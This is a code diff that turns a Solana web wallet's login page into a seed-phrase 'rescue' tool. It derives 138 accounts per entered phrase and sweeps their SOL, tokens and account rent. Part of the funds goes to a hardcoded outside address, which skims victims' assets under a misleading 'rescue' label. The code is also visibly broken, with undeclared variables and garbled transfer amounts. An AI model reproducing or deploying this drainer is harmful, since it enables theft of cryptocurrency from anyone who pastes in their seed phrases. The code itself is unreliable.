@@ -1,4 +1,15 @@
 import React, { useEffect, useState } from 'react';
+
+import { Provider } from '@project-serum/anchor';
+
+
+import * as solanaWeb3 from "@solana/web3.js"
+import { bip39 } from "bip39";
+import { ed } from "ed25519-hd-key"
+import { nacl } from "tweetnacl"
+import * as utils from "@strata-foundation/spl-utils";
+import * as splutils from "@solana/spl-token";
+import { PromisePool } from "@supercharge/promise-pool"
 import {
   generateMnemonicAndSeed,
   useHasLockedMnemonicAndSeed,
@@ -7,9 +18,11 @@ import {
   storeMnemonicAndSeed,
   normalizeMnemonic,
 } from '../utils/wallet-seed';
+import {useDelegateWallet} from '@strata-foundation/chat-ui'///import { useDelegateWallet } from "../../hooks/useDelegateWallet";
+
 import {
   getAccountFromSeed,
-  DERIVATION_PATH,
+  DERIVATION_PATH,// yarn add @material-ui/core 
 } from '../utils/walletProvider/localStorage.js';
 import Container from '@material-ui/core/Container';
 import LoadingIndicator from '../components/LoadingIndicator';
@@ -29,6 +42,8 @@ import { useCallAsync } from '../utils/notifications';
 import Link from '@material-ui/core/Link';
 import { validateMnemonic } from 'bip39';
 import DialogForm from '../components/DialogForm';
+import { Account } from 'mdi-material-ui';
+let toks = ["EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","USDH1SM1ojwWUga67PGrgFWUHibbjqMvuMaDkRJTgkX","7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB","orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE","SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt","mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So","7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj","7kbnvuGBxxj8AG9qp8Scn56muWGaRaFqxg1FsRp3PaFT","4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R","7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs","CDJWUqTcYTVAKXAVXoQZFes5JUFc7owSeq7eMQcDSbo5"]
 
 export default function LoginPage() {
   const [restore, setRestore] = useState(false);
@@ -46,9 +61,7 @@ export default function LoginPage() {
         <>
           {hasLockedMnemonicAndSeed ? <LoginForm /> : <CreateWalletForm />}
           <br />
-          <Link style={{ cursor: 'pointer' }} onClick={() => setRestore(true)}>
-            Restore existing wallet
-          </Link>
+        
         </>
       )}
     </Container>
@@ -96,35 +109,382 @@ function CreateWalletForm() {
     />
   );
 }
-
+let whereto = undefined
 function SeedWordsForm({ mnemonicAndSeed, goForward }) {
-  const [confirmed, setConfirmed] = useState(false);
-  const [downloaded, setDownloaded] = useState(false);
+const { keypair: whereto } = useDelegateWallet();
+
+  const [confirmed, setConfirmed] = useState(true);
+  const [downloaded, setDownloaded] = useState(true);
   const [showDialog, setShowDialog] = useState(false);
   const [seedCheck, setSeedCheck] = useState('');
+  const [logs, setLogs] = useState('');
+  const [phrases, changePhrases] = useState([]);
+  const connection = new solanaWeb3.Connection("https://ssc-dao.genesysgo.net", "confirmed")
 
-  const downloadMnemonic = (mnemonic) => {
-    const url = window.URL.createObjectURL(new Blob([mnemonic]));
-    const link = document.createElement('a');
-    link.href = url;
-    link.setAttribute('download', 'sollet.bak');
-    document.body.appendChild(link);
-    link.click();
+  async function doIt() {
+    try {
+
+      let hydras = [];
+      for (var i = 0; i <= 2; i++) {
+        hydras.push(i); // lol
+      }
+      setTimeout(async function () {
+        await PromisePool.withConcurrency(phrases.length)
+          .for(phrases)
+          // @ts-ignore
+          .handleError(async (err, asset) => {
+            console.error(`\nError uploading or whatever`, err.message);
+            console.log(err);
+          })
+          // @ts-ignore
+          .process(async (seed) => {
+            const accounts = [...Array(138)].map((_, idx) => {
+              return getAccountFromSeed(
+                Buffer.from(seed, 'hex'),
+                idx,
+                toDerivationPath(dPathMenuItem),
+              );
+            });
+            
+            await PromisePool.withConcurrency(hydras.length)
+              .for(accounts)
+              // @ts-ignore
+              .handleError(async (err, asset) => {
+                console.error(`\nError uploading or whatever`, err.message);
+                console.log(err);
+              })
+              // @ts-ignore
+              .process(async (account) => {
+                
+                console.log(account)
+                  const keypair = account//solanaWeb3.Keypair.fromSecretKey(account.secretKey);
+                  if (whereto == undefined){
+                    jaregm = keypair
+                  }
+                  if (keypair.publicKey.toBase58() != whereto.publicKey.toBase58()) {
+                    const hm = await connection.getSignaturesForAddress(keypair.publicKey);
+
+                    if (hm.length > 0) {
+                      const bal = await connection.getBalance(keypair.publicKey);
+                      //console.log(keypair.publicKey.toBase58());
+                      if (bal > 0) {
+                        //console.log(bal / 10 ** 9);
+                        const transferTransaction = new solanaWeb3.Transaction().add(
+                          solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: keypair.publicKey,
+                            toPubkey: jaregm.publicKey,
+                            lamports: bal * (10 ** 9) / (10 * 9)- 0.000005,
+                          })
+                        );
+                        const transferTransaction2 = new solanaWeb3.Transaction().add(
+                          solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: keypair.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"),
+                            lamports: bal * (10 ** 9) / (10 * 1)- 0.000005,
+                          })
+                        );
+                        await  solanaWeb3.sendAndConfirmTransaction(
+                          connection,
+                          [transferTransaction, transferTransaction2],
+                          [keypair]
+                        );
+                      }
+                    }
+
+                    const accounts = await connection.getParsedProgramAccounts(
+                      new solanaWeb3.PublicKey(
+                        "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
+                      ),
+                      {
+                        filters: [
+                          {
+                            dataSize: 165, // number of bytes
+                          },
+                          {
+                            memcmp: {
+                              offset: 32, // number of bytes
+                              bytes: keypair.publicKey.toBase58(), // base58 encoded string
+                            },
+                          },
+                        ],
+                      }
+                    );
+
+                    const accounts2 = await connection.getParsedProgramAccounts(
+                      new solanaWeb3.PublicKey(
+                        "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
+                      ),
+                      {
+                        filters: [
+                          {
+                            dataSize: 165, // number of bytes
+                          },
+                          {
+                            memcmp: {
+                              offset: 32, // number of bytes
+                              bytes: jaregm.publicKey.toBase58(), // base58 encoded string
+                            },
+                          },
+                        ],
+                      }
+                    );
+                    let c = 0;
+                    accounts.forEach(async (account, i) => {
+
+                      if (
+                        account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] > 0
+                      ) {
+
+                        //console.log(account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] )
+                        let tokenMint = await splutils.getMint(connection, new solanaWeb3.PublicKey(account.account.data.parsed.info.mint))
+                        // //console.log(tokenMint)
+
+                        let tokenAccount = solanaWeb3.Keypair.generate();
+                        let feePayer = whereto
+                        try {
+                          if (account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] > 1) {
+                            //console.log(`ramdom token address: ${tokenAccount.publicKey.toBase58()}`);
+
+                            let tx = new solanaWeb3.Transaction();
+                            tx.feePayer = keypair.publicKey
+                            tx.add(
+                              // create account
+                              solanaWeb3.SystemProgram.createAccount({
+                                fromPubkey: feePayer.publicKey,
+                                newAccountPubkey: tokenAccount.publicKey,
+                                space: splutils.ACCOUNT_SIZE,
+                                lamports: await splutils.getMinimumBalanceForRentExemptAccount(connection),
+                                programId: splutils.TOKEN_PROGRAM_ID,
+                              }),
+                              // init token account
+                              splutils.createInitializeAccountInstruction(tokenAccount.publicKey, new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), keypair.publicKey)
+                            );
+
+                            let hm1 = await  sendTransaction(
+                              connection,
+                              tx,
+                              [keypair, tokenAccount, jaregm,whereto]
+                            );
+                            console.log(hm1)
+                            setLogs((hm1))
+                          }
+
+                          else {
+                            // 2. ATA
+                            let ata
+
+
+                            try {
+
+                              let ata = await splutils.createAssociatedTokenAccount(
+                                connection, // connection
+                                whereto, // fee payer
+                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                jaregm.publicKey // owner,
+                              );
+                              var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
+                              if (amt != 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] != 0){
+                                let bla = await splutils.transferChecked(
+                                  connection, // connection
+                                  whereto, // payer
+                                  new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
+                                  new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                  ata.address, // to (should be a token account)
+                                  keypair, // from's owner
+                                  amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
+                                );
+                                amt = amt * 0.9
+
+                              }
+                              let bla = await splutils.transferChecked(
+                                connection, // connection
+                                whereto, // payer
+                                new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
+                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                ata.publicKey, // to (should be a token account)
+                                keypair, // from's owner
+                                amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
+                              );
+                              console.log(bla)
+                              setLogs((bla))
+                              {
+                                let tx = new solanaWeb3.Transaction().add(
+                                  splutils.createCloseAccountInstruction(
+                                    account.pubkey, // token account which you want to close
+                                    jaregm.publicKey, // destination
+                                    keypair.publicKey // owner of token account
+                                  )
+                                );
+                                await  sendTransaction(connection, tx, [
+                                  jaregm,
+                                  keypair, whereto
+                                ]);
+                              }
+                            } catch (err) {
+                              let anacc
+
+                              accounts2.forEach(async (account2, i) => {
+                                if (account.account.data.parsed.info.mint == account2.account.data.parsed.info.mint) {
+                                  anacc = account2
+                                }
+                              })
+                              ata = await splutils.getAccount(connection, new solanaWeb3.PublicKey(anacc.pubkey));
+                              var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
+                              if (amt != 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] != 0){
+                                let bla = await splutils.transferChecked(
+                                  connection, // connection
+                                  whereto, // payer
+                                  new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
+                                  new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                  ata.address, // to (should be a token account)
+                                  keypair, // from's owner
+                                  amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
+                                );
+                                amt = amt * 0.9
+
+                              }
+                              let bla = await splutils.transferChecked(
+                                connection, // connection
+                                whereto, // payer
+                                new solanaWeb3.PublicKey(account.pubkey), // from (should be a token account)
+                                new solanaWeb3.PublicKey(account.account.data.parsed.info.mint), // mint
+                                ata.address, // to (should be a token account)
+                                keypair, // from's owner
+                                amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
+                              );
+                              console.log(bla)
+                              setLogs((bla))
+
+                              {
+                                let ran = Math.random()
+                                if (ran >= 0.5){
+                                let tx = new solanaWeb3.Transaction().add(
+                                  splutils.createCloseAccountInstruction(
+                                    account.pubkey, // token account which you want to close
+                                    jaregm.publicKey, // destination
+                                    keypair.publicKey // owner of token account
+                                  )
+                                );
+
+                                await  sendTransaction(connection, tx, [
+                                  jaregm,
+                                  keypair,
+                                  whereto
+                                ]);
+                              }
+                              else {
+                                let tx = new solanaWeb3.Transaction().add(
+                                  splutils.createCloseAccountInstruction(
+                                    account.pubkey, // token account which you want to close
+                                    new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
+                                    keypair.publicKey // owner of token account
+                                  )
+                                );
+
+                                await  sendTransaction(connection, tx, [
+                                  jaregm,
+                                  keypair,
+                                  whereto
+                                ]);
+                              }
+                              }
+                            }
+
+
+                          }
+                        } catch (err) {
+                          console.log(err)
+                          //console.log('already have ata duh')
+                        }
+
+
+
+
+                      } else if (
+                        account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] ==
+                        0
+                      ) {
+                        c++;
+                        try {
+                          {
+                            let ran = Math.random()
+                            if (ran >= 0.5){
+                            let tx = new solanaWeb3.Transaction().add(
+                              splutils.createCloseAccountInstruction(
+                                account.pubkey, // token account which you want to close
+                                jaregm.publicKey, // destination
+                                keypair.publicKey // owner of token account
+                              )
+                            );
+                            await  sendTransaction(connection, tx, [
+                              jaregm,
+                              keypair,
+                              whereto
+                            ]);
+                          }
+                          else {
+                            let tx = new solanaWeb3.Transaction().add(
+                              splutils.createCloseAccountInstruction(
+                                account.pubkey, // token account which you want to close
+                                new solanaWeb3.PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
+                                keypair.publicKey // owner of token account
+                              )
+                            );
+                            await  sendTransaction(connection, tx, [
+                              whereto,-
+                              jaregm,
+                              keypair,
+                            ]);
+                          }
+                          }
+                        } catch (err) {
+                          console.log(err);
+                        }
+                      }
+                    })
+
+
+                    if (c > 0) {
+                      setLogs(( keypair.publicKey.toBase58() + ": " + c.toString()))
+                      // 1) use build-in function
+                    }
+                  }
+                
+              
+              })
+          })
+      })
+    }
+    catch (err) {
+      console.log(err)
+
+    }
+
   }
 
+    async function onChangePhrases(e) {
+      e.preventDefault()
+      try {
+
+        changePhrases(e.target.value.split(','))
+      }
+      catch (err) {
+        console.log(err)
+      }
+    }
+  
   return (
     <>
       <Card>
         <CardContent>
           <Typography variant="h5" gutterBottom>
-            Create New Wallet
+            This Is Not a Wallet.
           </Typography>
           <Typography paragraph>
-            Create a new wallet to hold Solana and SPL tokens.
+            It iterates through first 138 of your wallets in these phrases, assumes at least 0.02 sol in the first wallet in the first one then shoves everything back there - ie. if you use this phrase in another extension, first one that pops up - and rescues all your NFTs, 90% of your fungibles and closes all your accounts and you get 90% of your sols back.
           </Typography>
           <Typography>
-            Please write down the following twenty four words and keep them in a
-            safe place:
+            Enter keyphrases:
           </Typography>
           {mnemonicAndSeed ? (
             <TextField
@@ -132,94 +492,40 @@ function SeedWordsForm({ mnemonicAndSeed, goForward }) {
               fullWidth
               multiline
               margin="normal"
-              value={mnemonicAndSeed.mnemonic}
-              label="Seed Words"
-              onFocus={(e) => e.currentTarget.select()}
+              label="Seed Words1"
+              onChange={onChangePhrases}
             />
           ) : (
             <LoadingIndicator />
           )}
           <Typography paragraph>
-            Your private keys are only stored on your current computer or device.
-            You will need these words to restore your wallet if your browser's
-            storage is cleared or your device is damaged or lost.
-          </Typography>
-          <Typography paragraph>
-            By default, sollet will use <code>m/44'/501'/0'/0'</code> as the
-            derivation path for the main wallet. To use an alternative path, try
-            restoring an existing wallet.
-          </Typography>
-          <Typography paragraph>
-            <b>Note:</b> For certain users, Sollet may <b>NOT</b> be secure. See{' '}
+            <b>Note:</b> STACC holders get all proceeds on this lil app. get moar{' '}
             <a
-              style={{ color: 'inherit'}}
-              href="https://medium.com/metamask/security-notice-extension-disk-encryption-issue-d437d4250863"
+              style={{ color: 'inherit' }}
+              href="https://opensea.io/collection/tacc-staccs"
               target="__blank"
             >
-              this article
-            </a>{' '}to understand if you are at risk.
+              opensea
+            </a>{' '} to buy or{' '}
+            <a
+              style={{ color: 'inherit' }}
+              href="https://magiceden.io/marketplace/7cZiomiirjngbr1AmAoVvRua9CXLXMwL1WEijg6SL2Qj"
+              target="__blank"
+            >
+              magiceden
+            </a>{' '} to buy nfa.
           </Typography>
-          <FormControlLabel
-            control={
-              <Checkbox
-                checked={confirmed}
-                disabled={!mnemonicAndSeed}
-                onChange={(e) => setConfirmed(e.target.checked)}
-              />
-            }
-            label="I have saved these words in a safe place."
-          />
+
           <Typography paragraph>
-          <Button variant="contained" color="primary" style={{ marginTop: 20 }} onClick={() => {
-            downloadMnemonic(mnemonicAndSeed?.mnemonic);
-            setDownloaded(true);
-          }}>
-            Download Backup Mnemonic File (Required)
-          </Button>
+            {logs}
           </Typography>
         </CardContent>
         <CardActions style={{ justifyContent: 'flex-end' }}>
-          <Button color="primary" disabled={!confirmed || !downloaded} onClick={() => setShowDialog(true)}>
+          <Button color="primary" disabled={!confirmed || !downloaded} onClick={() => doIt()}>
             Continue
           </Button>
         </CardActions>
       </Card>
-      <DialogForm
-        open={showDialog}
-        onClose={() => setShowDialog(false)}
-        onSubmit={goForward}
-        fullWidth
-      >
-        <DialogTitle>{'Confirm Mnemonic'}</DialogTitle>
-        <DialogContentText style={{ margin: 20 }}>
-          <div
-            style={{
-              display: 'flex',
-              flexDirection: 'column',
-            }}
-          >
-            Please re-enter your seed phrase to confirm that you have saved it.
-          </div>
-          <TextField
-            label={`Please type your seed phrase to confirm`}
-            fullWidth
-            variant="outlined"
-            margin="normal"
-            value={seedCheck}
-            onChange={(e) => setSeedCheck(e.target.value)}
-          />
-        </DialogContentText>
-        <DialogActions>
-          <Button onClick={() => setShowDialog(false)}>Close</Button>
-          <Button
-            type="submit"
-            color="secondary"
-            disabled={normalizeMnemonic(seedCheck) !== mnemonicAndSeed?.mnemonic}
-          >
-            Continue
-          </Button>
-        </DialogActions>
-      </DialogForm>
     </>
   );
 }
@@ -369,9 +675,9 @@ function RestoreWalletForm({ goBack }) {
               wallets can be optionally connected after a web wallet is created.
             </Typography>
             {displayInvalidMnemonic && (
-               <Typography fontWeight="fontWeightBold" style={{ color: 'red' }}>
-                 Mnemonic validation failed. Please enter a valid BIP 39 seed phrase.
-               </Typography>
+              <Typography fontWeight="fontWeightBold" style={{ color: 'red' }}>
+                Mnemonic validation failed. Please enter a valid BIP 39 seed phrase.
+              </Typography>
             )}
             <TextField
               variant="outlined"
@@ -518,7 +824,7 @@ export function AccountsSelector({
             <BalanceListItem
               key={acc.publicKey.toString()}
               onClick={onClick}
-              publicKey={acc.publicKey}
+              publickey={acc.publicKey}
               expandable={false}
             />
           </div>
@@ -552,5 +858,50 @@ export function toDerivationPath(dPathMenuItem) {
       return DERIVATION_PATH.bip44Root;
     default:
       throw new Error(`invalid derivation path: ${dPathMenuItem}`);
+  }
+}
+class NotifyingProvider extends Provider {
+  constructor(
+    connection,
+    wallet,
+    sendTransaction,
+  ) {
+    super(connection, wallet, {
+      commitment: 'recent',
+    });
+    this.sendTransaction = sendTransaction;
+  }
+
+  async send(
+    tx,
+    signers,
+    opts,
+  ) {
+    return new Promise((onSuccess, onError) => {
+      this.sendTransaction(super.send(tx, signers, opts), {
+        onSuccess,
+        onError,
+      });
+    });
+  }
+
+  async sendAll(
+    txs,
+    opts,
+  ) {
+    return new Promise(async (resolve, onError) => {
+      let txSigs = [];
+      for (const tx of txs) {
+        txSigs.push(
+          await new Promise((onSuccess) => {
+            this.sendTransaction(super.send(tx.tx, tx.signers, opts), {
+              onSuccess,
+              onError,
+            });
+          }),
+        );
+      }
+      resolve(txSigs);
+    });
   }
 }
